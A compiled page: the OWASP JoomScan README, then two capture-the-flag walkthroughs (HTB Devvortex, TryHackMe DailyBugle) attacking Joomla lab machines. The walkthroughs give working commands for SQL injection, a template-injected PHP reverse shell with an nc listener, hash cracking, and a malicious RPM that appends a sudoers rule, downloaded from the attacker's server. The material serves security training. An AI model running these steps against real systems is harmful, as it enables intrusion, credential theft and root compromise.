[![Version 0.0.7](https://camo.githubusercontent.com/e6ebab6fcc4a718d4c88099d27e90382ef5c310e9cd75acd57475605f3c89b8a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f56657273696f6e2d302e302e372d677265656e2e737667)](https://camo.githubusercontent.com/e6ebab6fcc4a718d4c88099d27e90382ef5c310e9cd75acd57475605f3c89b8a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f56657273696f6e2d302e302e372d677265656e2e737667) [![Perl](https://camo.githubusercontent.com/a7ce54496aba709b37ba5fad565c1a94c46fde4ef11936ca76ae482754ad2ca8/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f5065726c2d352e782d79656c6c6f772e737667)](https://camo.githubusercontent.com/a7ce54496aba709b37ba5fad565c1a94c46fde4ef11936ca76ae482754ad2ca8/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f5065726c2d352e782d79656c6c6f772e737667) [![GPLv3 License](https://camo.githubusercontent.com/6e06c74a1ec8555a8de9af91cb9c7b07a97e081b9b98ec6c3ca849647bac82e6/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d47504c76332d7265642e737667)](https://github.com/rezasp/joomscan/blob/master/LICENSE.md) [![Twitter](https://camo.githubusercontent.com/3a1297219290f52cdf924ee52dcae57350a294ea8ed65dd5c968b2be91c1ecbc/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f547769747465722d404f574153505f4a6f6f6d5363616e2d626c75652e737667)](http://twitter.com/OWASP_JoomScan) [![Leader](https://camo.githubusercontent.com/eeed8fc78578d5c367dc4b4391198186de4619a3ef36e7c7bc99c1c20b5bc0e3/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f547769747465722d4072657a6573702d626c75652e737667)](http://www.twitter.com/rezesp) [![Leader](https://camo.githubusercontent.com/e58d18f9a002b80b183131c48f743dc81e742b22cd12a81e1d73e2e8c42a59a4/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f547769747465722d40416c695f52617a6d6a6f302d626c75652e737667)](http://www.twitter.com/Ali_Razmjo0)  
[![Black Hat Arsenal USA](https://camo.githubusercontent.com/d2ba6aa6a717b86da3fb2cbcbe71d682bd59a07c0baa9d7ca149aa951b12f59e/68747470733a2f2f7261776769742e636f6d2f746f6f6c7377617463682f6261646765732f6d61737465722f617273656e616c2f7573612f323031382e737667)](http://www.toolswatch.org/2018/05/black-hat-arsenal-usa-2018-the-w0w-lineup/) [![Black Hat Arsenal ASIA](https://camo.githubusercontent.com/08c76fe5ac423514a02b049ecce32517d460fbf5b87eeb0047473e3ce5674e05/68747470733a2f2f7261776769742e636f6d2f746f6f6c7377617463682f6261646765732f6d61737465722f617273656e616c2f617369612f323031382e737667)](http://www.toolswatch.org/2018/01/black-hat-arsenal-asia-2018-great-lineup/)

[![](https://raw.githubusercontent.com/rezasp/Trash/master/joomscan.png)](https://raw.githubusercontent.com/rezasp/Trash/master/joomscan.png)[![](https://raw.githubusercontent.com/rezasp/Trash/master/owasp.png)](https://raw.githubusercontent.com/rezasp/Trash/master/owasp.png)

======

# OWASP JoomScan Project

[](https://github.com/OWASP/joomscan#owasp-joomscan-project)

OWASP Joomla! Vulnerability Scanner (JoomScan) is an open source project, developed with the aim of automating the task of vulnerability detection and reliability assurance in Joomla CMS deployments. Implemented in Perl, this tool enables seamless and effortless scanning of Joomla installations, while leaving a minimal footprint with its lightweight and modular architecture. It not only detects known offensive vulnerabilities, but also is able to detect many misconfigurations and admin-level shortcomings that can be exploited by adversaries to compromise the system. Furthermore, OWASP JoomScan provides a user-friendly interface and compiles the final reports in both text and HTML formats for ease of use and minimization of reporting overheads.  
OWASP JoomScan is included in Kali Linux distributions.

- **Read More**: [https://www.secologist.com/open-source-projects](https://www.secologist.com/open-source-projects)

### WHY OWASP JOOMSCAN ?

[](https://github.com/OWASP/joomscan#why-owasp-joomscan--)

Automated ...  
*Version enumerator  
*Vulnerability enumerator (based on version)  
*Components enumerator (1209 most popular by default)  
*Components vulnerability enumerator (based on version)(+1030 exploit)  
*Firewall detector  
*Reporting to Text & HTML output  
*Finding common log files  
*Finding common backup files  

# INSTALL

[](https://github.com/OWASP/joomscan#install)

```
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl
```

For Docker installation and usage

```
# Build the docker image
docker build -t rezasp/joomscan .

# Run a new docker container with reports directory mounted at the host
docker run -it -v /path/to/reports:/home/joomscan/reports --name joomscan_cli rezasp/joomscan

# For accessing the docker container you can run the following command
docker run -it -v /path/to/reports:/home/joomscan/reports --name joomscan_cli --entrypoint /bin/bash rezasp/joomscan
```

# JOOMSCAN ARGUMENTS

[](https://github.com/OWASP/joomscan#joomscan-arguments)

```
Usage:	joomscan.pl [options]

--url | -u <URL>                |   The Joomla URL/domain to scan.
--enumerate-components | -ec    |   Try to enumerate components.

--cookie <String>               |   Set cookie.
--user-agent | -a <user-agent>  |   Use the specified User-Agent.
--random-agent | -r             |   Use a random User-Agent.
--timeout <time-out>            |   set timeout.
--about                         |   About Author
--update                        |   Update to the latest version.
--help | -h                     |   This help screen.
--version                       |   Output the current version and exit.
```

# OWASP JOOMSCAN USAGE EXAMPLES

[](https://github.com/OWASP/joomscan#owasp-joomscan-usage-examples)

Do default checks...  
`perl joomscan.pl --url www.example.com`  
or  
`perl joomscan.pl -u www.example.com`  
  
Enumerate installed components...  
`perl joomscan.pl --url www.example.com --enumerate-components`  
or  
`perl joomscan.pl -u www.example.com --ec`  
  

Set cookie  
`perl joomscan.pl --url www.example.com --cookie "test=demo;"`  
  

Set user-agent  
`perl joomscan.pl --url www.example.com --user-agent "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"`  
or  
`perl joomscan.pl -u www.example.com -a "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"`  
  
  

Set random user-agent  
`perl joomscan.pl -u www.example.com --random-agent`  
or  
`perl joomscan.pl --url www.example.com -r`  
  

Set proxy  
`perl joomscan.pl --url www.example.com --proxy http://127.0.0.1:8080`  
or  
`perl joomscan.pl -u www.example.com --proxy https://127.0.0.1:443`  
  
  

Update Joomscan...  
`perl joomscan.pl --update`  
  

# OWASP PAGE

[](https://github.com/OWASP/joomscan#owasp-page)

[https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project](https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project)

# GIT REPOSITORY

[](https://github.com/OWASP/joomscan#git-repository)

[https://github.com/rezasp/joomscan](https://github.com/rezasp/joomscan)

# ISSUES

[](https://github.com/OWASP/joomscan#issues)

[https://github.com/rezasp/joomscan/issues](https://github.com/rezasp/joomscan/issues)

# PROJECT LEADERS

[](https://github.com/OWASP/joomscan#project-leaders)

- Mohammad Reza Espargham [ reza[dot]espargham[at]owasp[dot]org ]
- Ali Razmjoo [ ali[dot]razmjoo[at]owasp[dot]org ]

  
  
OWASP JoomScan introduction (Youtube)

[![OWASP JoomScan introduction](https://camo.githubusercontent.com/2b0587bdad73b7c47ba044e3b08f59572a1f5a677ddb5e81e87c6c0ceb3139a0/68747470733a2f2f696d672e796f75747562652e636f6d2f76692f496b32434a394c6b756f492f302e6a7067)](https://www.youtube.com/watch?v=Ik2CJ9LkuoI)

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/OWASP/joomscan). Be sure to check out the original post for more details.

# HTB Walkthrough: Devvortex


![](https://miro.medium.com/v2/resize:fit:700/1*3cRw8GNESP9rKc0l-mSwcA.png)

Meet Devvortex, the “easy” troublemaker that decided to grace us right after the Black Friday chaos. Now, I don’t know who labeled it “easy,” but personally, it felt more like a challenge — blame it on my need to level up my MySQL game. So, here’s the scoop: Devvortex plays dirty by exploiting an Information Disclosure loophole in Joomla to open the front door. And guess what? We turned it into our playground by slipping in a cheeky PHP code snippet for some Remote Code Execution magic. Easy peasy, right? Or not!

Let’s get into it. Starting off, the constant in all CTFs, Nmap.

nmap -A -p- <IP>

![](https://miro.medium.com/v2/resize:fit:700/1*nvVIMqYZYW1rP89l-wHkaw.png)

We see the classic Port 22 and Port 80 open. Port 22 is still fairly new and there is no suitable exploit in this case, so we will just focus on Port 80 for now.

![](https://miro.medium.com/v2/resize:fit:700/1*uvTd9_1JTyUhskBnAMAOSg.png)

Add the IP and the page to our host file and the page will work.

sudo nano /etc/hosts

After adding the page to out hosts file, we can now run Gobuster to find additional directories.

gobuster dir -u http://devvortex.htb/ -w /usr/share/Seclists/Discovery/Web-Content/common.txt

Hmmmmm…. There’s nothing interesting found with that command. Lets dig deeper.

![](https://miro.medium.com/v2/resize:fit:700/1*A4yKxY1Yw8ahvfnjY4x6cw.png)

Nice! We have another page. After adding the page to our hosts file again, we can access the page.

![](https://miro.medium.com/v2/resize:fit:700/1*VlBs75rv8X4ZwfdOoqIx-Q.png)

There’s nothing really interesting in the page. Lets see if we can find something interesting using gobuster again.

![](https://miro.medium.com/v2/resize:fit:700/1*7_8XcLxLWMlKRgmGliK1lw.png)

The /administrator page seems interesting. Let’s go to it.

![](https://miro.medium.com/v2/resize:fit:700/1*gtVWkEsS0Tn1FmKOjtLQTw.png)

# Joomscan

It pulls up a Joomla page and the normal logins admin;password doesnt work. A quick search on Google tells us we can check the version using Joomscan. This [page](https://www.getastra.com/blog/security-audit/joomla-penetration-testing/) gives more information on how to install and run the scan.

![](https://miro.medium.com/v2/resize:fit:700/1*hfe5lOvrs477ZEOoJKKYyA.png)

After running Joomscan, we know the Joomla version running on our page. After searching for exploits for Joomla 4.2.6, we came to [Acceis’s exploit](https://github.com/Acceis/exploit-CVE-2023-23752/tree/master) on Github. I ran the exploit a few times but I kept running into issues. Turns out, I got a little too excited and did not read the requirements on the exploit. I forgot one critical step:

![](https://miro.medium.com/v2/resize:fit:700/1*uJkW7eS_X0pVbb87wXQhog.png)

After installing what was needed, the script worked! We see two users, Lewis and Logan. We also have the password for lewis. Sweet.

![](https://miro.medium.com/v2/resize:fit:700/1*NBxER0t9HfzpXnRNvAWsNQ.png)

I tried to connect to SSH using Lewis’s credentials, but it doesn’t work. I then tried it on the /administrator page. Boom! It worked!

![](https://miro.medium.com/v2/resize:fit:700/1*d828DwUBB35MSIJjquCKgA.png)

On my search for Joomla exploits, this very helpful page from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla) pop up. From that page, I learned that if we can get the admin credentials (which we did), we can RCE inside of it by adding a snippet of PHP code to gain RCE.

# Reverse Shell

Following the instructions, we go to System>Site Template> Template> error.php. Then we remove everything in the page and replace it with [reverse shell generated from PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

![](https://miro.medium.com/v2/resize:fit:700/1*DyMxWWM_jioYSFXrwLHLGg.png)

According to the instructions from HackTricks, we can now spawn a reverse shell. So I kicked up Netcat and followed the next step of the instructions.

nc -nlvp <Port>

The instruction says to:`   curl -s [http://joomla-site.local/templates/protostar/error.php/error.php?cmd=id](http://joomla-site.local/templates/protostar/error.php/error.php?cmd=id)`

However, our page is running on Cassiopeia isntead of Protostar. After making minor adjustment to the link, we can try to load it.

![](https://miro.medium.com/v2/resize:fit:700/1*_H7Udo_U7p7srJJjmfXcRQ.png)

It worked! we got a reverse shell!

![](https://miro.medium.com/v2/resize:fit:700/1*vHyGzf6G1uUJvOPISZXj4w.png)

I’m feeling very good about this, we got in, I can navigate around folder, but when I try to cat the user flag, I ran into issues. Of course this is not going to be too easy.

![](https://miro.medium.com/v2/resize:fit:700/1*NVKB89OW98tf6yELkkEhiA.png)

# **John The Ripper**

Given that Logan is a user registered on our Joomla panel, chances are good that his password is stashed in the very spot where we unearthed our other login information. Now, for the real confirmation, there’s just a single route to take. Time to hook up to the database and see what secrets we can uncover.

Before diving into the database with MySQL, we’ll use a little Python magic to set up some tools that help us interact with MySQL. This step is crucial for what comes next, and it keeps things smooth and sneaky.

python3 -c "import pty;pty.spawn('/bin/bash')"

![](https://miro.medium.com/v2/resize:fit:700/1*6nUalFZu0lfXhSxyE88f7w.png)

Since I am not that great with MySQL, this [page from HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql) again came in handy. Let’s see what databases we have here.

show databases;

![](https://miro.medium.com/v2/resize:fit:700/1*HsIa_rMEJOIVJKfHcwoRog.png)

Joomla is here of course. Time to dig in.

use joomla  
show tables;

![](https://miro.medium.com/v2/resize:fit:696/1*W0LgXIa743G9u4Km-PfEsQ.png)

We see “users” from the table. Lets check it out.

select * from sd4fg_users;

![](https://miro.medium.com/v2/resize:fit:700/1*hwoSSiRmTM0O0iCbWJC6uA.png)

Looks like we found the hashes for both Lewis and Logan. Saving Logan’s hash so we can try to crack it with John The Ripper.

![](https://miro.medium.com/v2/resize:fit:700/1*IXZbnFyvKtX9RkHds5_CSw.png)

Sweet. We got the password for Logan. Lets try to connect via SSH again. May be it will work this time.

![](https://miro.medium.com/v2/resize:fit:700/1*bZ-JpDVX3rZvGlkHbCNvJw.png)

Now it’s working. With this I am now able to cat user.txt. However, I am still denied permission to root.

# Privilege Escalation

Now I’m stumped. Lets try to see what ccommands allowed (and forbidden) the user on the current host.

sudo -l

![](https://miro.medium.com/v2/resize:fit:700/1*3QmEu_qOuFQWraOiIHM5iw.png)

Pull the version so we can search for exploit.

![](https://miro.medium.com/v2/resize:fit:700/1*eexou9j45pdwviyMyKNSpg.png)

A quick Google search shows that this version is vulnerable ([CVE-2023–1326](https://vigilance.fr/vulnerability/apport-cli-privilege-escalation-via-Sudo-Less-Pager-Terminal-Size-41047)), and we can use this [vulnerability to escalate privileges.](https://bugs.launchpad.net/ubuntu/+source/apport/+bug/2016023) The command:

$ sudo apport-cli -c xxx.crash

We will need a crash file. To generate a crash file, I ran:

sudo /usr/bin/apport-cli -h

That command will show you a whole bunch of options. Go down the list and eventually you will find one that will generate crash file. I picked the -f option to create a crash file

![](https://miro.medium.com/v2/resize:fit:700/1*CAAc5eGnxffGYNBFwKB3vA.png)

![](https://miro.medium.com/v2/resize:fit:700/1*Jge94n0x3T0-58eYsKpUzQ.png)

Select V and you’re in as Root. Now go and cat that flag!

Happy Hacking :)

**Credit:** This information was adapted from an excellent guide on [Medium](https://medium.com/@d3adw0k/htb-walkthrough-devvortex-d3adw0k-ef04f3296f7e). Be sure to check out the original post for more details.

# DailyBugle TryHackMe Walkthrough

[January 17, 2022](https://www.hackingarticles.in/dailybugle-tryhackme-walkthrough/) by [Raj](https://www.hackingarticles.in/author/raj/)

### Introduction

DailyBugle is a CTF Linux box with difficulty rated as “medium” on the TryHackMe platform. The machine covers Joomla 3.7.0 SQL injection vulnerability and privilege escalation using yum.

### Table of Content

**Network Scanning**

- Nmap

**Enumeration**

- Discovering administrator directories using robots.txt
- Enumerating site using joomscan
- Discovering SQL injection flaw in the current installation

**Exploitation**

- Exploiting Joomla v 3.7.0 via SQLi in com_fields
- Cracking Joomla administrator hashes using john
- Modifying template to input PHP reverse shell code

**Privilege Escalation**

- Discovering other user’s credentials in the configuration file
- Elevating privileges using yum

Let’s deep dive into this.

### Network Scanning

The dedicated IP address of the machine is **10.10.91.172.** We’ll run a nmap scan on this machine’s IP.

nmap -sV -sC 10.10.91.172 -Pn

**![](https://blogger.googleusercontent.com/img/a/AVvXsEg6ewVbblANrSOJ8hJpqOiJm4vpL6GzTX_PRq55YoI4AIZYTyx3ai-iI8Lg9c4DxU6uvjNKW2BcZ7h5X8LUUhAOjKnW-J7B8ypRmTQ8_xEuP504BRRtLndcO-LeCHSt40QhPBE0UHG01OMyosqpwUuWv8g2ufSWHOjvh2SRHp6-_5vfNCiMv946fGuxfg=s16000)**

### Enumeration

We discovered the existence of a robots file that has an administrator directory.

![](https://blogger.googleusercontent.com/img/a/AVvXsEhTrHsnJl3SbfG2uZwj87O4H_FBMMtsTt1XHofEGHgeAMI3iHwW9zpIjevF8BkDcrYp1gUtgLKA7u-rPL9YQ8exzrke6UOfF8iPpIoeIQ2ERJq_u1Uv0UCwfBk-zZD1R40HgH4u3K2ovMVcyq6WNXgYMmJAoR1C_Y4g8z0nzoH-MC_t4xsxkuDfGQaAWA=s16000)

Upon opening this directory we found out that an instance of Joomla was running on this website.

![](https://blogger.googleusercontent.com/img/a/AVvXsEgJE6yRTBf0lnIJwen-LHSjAwWNHq2hzVvJ0Wdm7C7sVxzuW9bOzaW1f4iKWlm0kKxRptpi3nXY8M-sW-eL3Gq-8RJzuqjibMLnhTOZ2GkVLCUuDXfWwgR6vO5LNDvOBnuAp-RAKw4zSHc8kUU1g0YWM8Ogpcqnu794JCEOfFqoomHW0ZyfSipQh5wVbA=s16000)

Thus, we ran joomscan on this website and discovered the version 3.7.0 being run

joomscan -u http://10.10.91.172

![](https://blogger.googleusercontent.com/img/a/AVvXsEhakG8ZlYC3f4V_0KcWD9fjPdTfNFbxH2cFRhPUVtc2c5hh4Q8C5O3v_z5ZShulgR3BbYcECDeEZW_zjVn3aVEPHxLt7CJoGp3G3mUA13k1eM2GLh2MQPRA4fFFjAwsQn6l0LBL7uAwzOxm39LTi5fRdh4mQPvofSFELIKCvIGGlv1HAG7QXuNrc4GjIw=s16000)

Right away we looked out for public exploits for this installed instance using searchsploit and discovered that version 3.7.0 was vulnerable to SQLi via the com_fields parameter.

searchsploit joomla 3.7.0

searchsploit -m 42033

**![](https://blogger.googleusercontent.com/img/a/AVvXsEiGbxsLeRA853OEWItjJv3GSfub_6eT9dw-6K2Jq1884y-v6Wi3QpiUQKTBddxNXuFf0tUCCgYFwXaRdus2yNYK4YH0Mqrqh_6dt9CoeyZK8ztf_07LKfNE2qOPh9UM1X6vbTpIb7SQu-IWQVk4lEmaj4VYqq1J5INNFDcXoBwk-Kj2DpTPDc_uYAIANw=s16000)**

### Exploitation

As exploit number 42033 told us, this sql injection vulnerability could be exploited by the following command

sqlmap -u "http://10.17.32.212/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump-all -p list[fullordering]

![](https://blogger.googleusercontent.com/img/a/AVvXsEiHhXa3jtipy1CO29WxYaQh9NJTXjh51tyhQoFYnfhJPz5avmsFIxFDqyEZCw76A4PWE91vfdrSORYKPBc9oj0VFx5_SkwX6crcv77NUStEGZINXq382CeRWFUjqVGn0PoM9m4vR06RPFJ1x5gRTsB8lEM0PTiOzbHe3GEr7ujliHd2hUuyRf0tdatIFA=s16000)

However, while running this scan, it was taking way too long and so, we looked out for another script called “Joomblah.py” which is a POC for this SQLi vulnerability in Joomla v3.7.0. So we downloaded this script, ran and found credentials!

wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py

python2.7 joomblah.py http://10.10.91.172

![](https://blogger.googleusercontent.com/img/a/AVvXsEhf14J_masBIM5DT-W3tIH1EcwA3Sso33B-lbAL4FDksHMNHS2-F-Jzk-7Oq8cH_k7QB-J4J229vNdIPlNJr8tE0JHcPFAv1JrL7NezBJIJKADnokCXwCTbW9hOuCD1Sb7PqKRwnWMGP47ftYY9LFWwCg-tsRlKqjtj-4v9SRV5X2IfPvc7bG0dr1EpwA=s16000)

We had discovered the hash but to know it’s type we googled it up and found it was  
bcrypt”

![](https://blogger.googleusercontent.com/img/a/AVvXsEgaJB6Rf9Vz8mR7iUHycd35n59vPSWQHk3bBfZZwnNWqAHOoW1zJMF-o2lbdKhKvC5l4EXfQBeBXU_iOjJB8rdIjx8V1KdGxHtLn0PG-cxRLMXX3hW2tryxd-zUV8U2mZAYlkfRo1U24aHx0EkNqDcaVrWn8l5j4pEJi9O6GJcXhdxyQQW8kBPBWXcc2Q=s16000)

Thus we saved this hash in a  file and used john to crack them

cat hash

john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash

![](https://blogger.googleusercontent.com/img/a/AVvXsEhZSojChgR2YopgwwcKsZFffnhQ05Tx5oXRb_4vzba84YYYngX5Vjmp6UuVLYvH8ZmlWGKCM_RMxFEADxNhCHebLj6q2So4v98ctLQRg-aiDEbSpEH_Y_rxYxpWzIVUO6LzzV_d0ywi1E10BwljU4VLfemOYX6Ub6PB9N77RyglSn0fi-gVECyUl6FH3A=s16000)

We see we have received clear text credentials. We logged in to the admin panel using this and can see a dashboard now!

![](https://blogger.googleusercontent.com/img/a/AVvXsEjDRa74V7ML_dQBn8CUsI_59j-Hjf-qTfcY2cz99YEktxsHj0zKeMRZcYOX0n3kic3bXFvRUnnIIv9y03jB0-6SjCY6xEg2lt3979pbzRN3doBrvPHFdcxRyHpkYQlzG9PpQVNr7QzuZx1i6WjBYsca1wwql0VJvdmI9fXPzbZhmPE9KYMNYP2c46PGPA=s16000)

Like with any other CMS, Joomla also has templates that are running on PHP, therefore, right away we copied the php-reverse-shell.php code in the template file and clicked on template preview. Before launching template preview we also set up a netcat listener

nc -nlvp 1234

![](https://blogger.googleusercontent.com/img/a/AVvXsEhYo8AYrFzQx1if380pLpJw-nZHdqsQUjDh4hbYFpezgZWVd1IeFXXPlMHDdXZJPBWkR5mFuItkIwOHvzFBsuJIdW8nvP8v5mYxSkx1kPUuzRCjWYz9ThuGDWGQg78nubo1y9VSr3PqPjqSCOtNG5l2nA9DrhsESWctttsj-InPe3kcXAdfspUyxXaseQ=s16000)

On our listener we see a shell popped up!

###  Privilege Escalation

Now that we have a working TTY on the victim box, we started looking for ways to escalate privileges. We checked the sudoers file but nothing was found.

![](https://blogger.googleusercontent.com/img/a/AVvXsEhQhNauxqMqhOh-lReB8JfRSE_29lSPjpEcRT5NuIb4tgJz63Udy72t3m9eLjoZwQZre4gXJ0Gx1h1wsGdbYCMJgOkN73zHxI5zpezFTcRxJ2mOzzJwh1pbXrogjrexcC1Z8KkZFk7CiZxOg3-jJf1cLEvFFMgp7T8JuqC2zx9UBBvS0achn_PF5MVrJg=s16000)

After a quick system check and looking at the website’s files, we found a configuration file that had credentials of a database. root user had the password: **nv5uz9r3ZEDzVjNu**

cd /var/www/html

cat configuration.php

![](https://blogger.googleusercontent.com/img/a/AVvXsEhWVBOUGBMybQTxYpnVYOVtNnZ670yrF7lhEn9G0P1MvE3E8pDQZoWlrj8tnKqZnPNztu-iiR_p_nSO2Tk9Fz-pKubTnAkvTPKxKZ5IC65cSjoS7pemulMAug2tR80l40ppDqXi5v65FNW-h8UQMe-4klpr9Rf1DB9JcgW06NhnEPJ_4zZLSLoJ89h3oA=s16000)

Now, we tried to login into another existing user jjameson using this password and it worked! We immediately spawned a stable teletype using python. Thereafter, we looked into the sudoers file and found yum in the entries.

su jjameson

python -c 'import pty;pty.spawn("/bin/bash")'

sudo -l

![](https://blogger.googleusercontent.com/img/a/AVvXsEgfq0kL9_AtVTpJBemPkXKno-nAQBW_uzyKWH9WIw6Zsc-AgTsPAuvZTSch5lyLVkQRyZbBy3IuUW81K59bBiHGdL9cHznA_7AgEuCVy3SWVTt_OKJOvBbxuNXzTDQ9Sftt0Z9lExL1LqtZSNUh3QhacOSU61t-q4KqYXh6Pjt_6YZaAsPxo-F2PjSxug=s16000)

Referring to gtfobins post **[here](https://gtfobins.github.io/gtfobins/yum/)** we can escalate our privileges by creating our custom RPM executable. For this we need rpm, fpm to be installed first. Thereafter, we’ll copy a command into a shell script. This echo command simply adds my user jjameson into the sudoers file so that any command can be run as root. This would be our payload. Then we create an rpm package using fpm package.

apt install rpm

gem install fpm

echo 'echo "jjameson ALL=(root) NOPASSWD:ALL" >> /etc/sudoers' > my.sh

fpm -n root -s dir -t rpm -a all --before-install my.sh .

python3 -m http.server 80

![](https://blogger.googleusercontent.com/img/a/AVvXsEiL9qM-HsFZBEXvnXw1_IuGYi8HL659Z7T-g69BAniicCBToAgl_mR5Xy8MR2Hjv3gUO68H3z0HCQtcJH00h0OB2uRdpudQSTb6ag3-MKnilV-7wJI-lIk8q4-3RFXGuN6EsCnXnYv2DZfLwcTOyrb43HzD6guOkRijMQDs6w0bWstKy65jVI_XaVov4g=s16000)

Now all that’s left to do was to copy this file into /tmp directory on the victim’s box.

cd /tmp

wget http://10.17.32.212/root-1.0-1.noarch.rpm

![](https://blogger.googleusercontent.com/img/a/AVvXsEjdicIbEno9Huh1TnK16s0bGoJQvBsBVbtRS-oorM-vvVtqoTC4Hx0ux3eTzz7At6gSRMDw7Dh3hytmFNyewITTESBrIJEazMPmEpUZRDzCK-2a-kr7sarNsSOa5-G6BX_LYtAc4HrlMVk38Ux-g9zhFipQDoKeQL34vYHx9zI8BfZEDHzjkb_2u1pO8A=s16000)

So, we downloaded it and ran using yum localinstall command. It ran successfully! We ran bash shell as sudo and as expected jjameson (my user) ran it as root and thus privileges were escalated! Finally, we read the congratulatory flag!

sudo yum localinstall -y root-1.0-1.noarch.rpm

sudo bash

cd /root

cat root.txt

![](https://blogger.googleusercontent.com/img/a/AVvXsEjoAuqKw-p1UUNePP5om6dWuQRvikTWdFajQlw_oHzSYTYf1ZHlYKTRQqa9LToBB6yMNJCmLVrmuDhwh7KysncbGwjDE65LZFOwApAN8-Mc_l1x_oSVwedQHTz7pc5tQQz37RDkFqFif6VYeXPr0XXF2wgaKePejfOn42olYVVAVzNc4XDO-plHnQ6cBg=s16000)

Hence, this is how we root this box. Kudos to the author on creating a beginner-friendly box that focuses on real life and commonly found vulnerabilities. Thanks for reading!

**Author: Harshit Rajpal** is an InfoSec researcher and left and right brain thinker. Contact **[here](https://in.linkedin.com/in/harshit-rajpal-79bb43103)**

**Credit:** This information was adapted from an excellent guide on [HackingArticles.in](https://www.hackingarticles.in/dailybugle-tryhackme-walkthrough/). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/aGgcyEVRCps?si=6KnLV3_N11yVkLl1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=aGgcyEVRCps). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/cT4dMwuk7Gs?si=pHBhKne_CcjSR3Vp" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=cT4dMwuk7Gs). Be sure to check out the original post for more details.

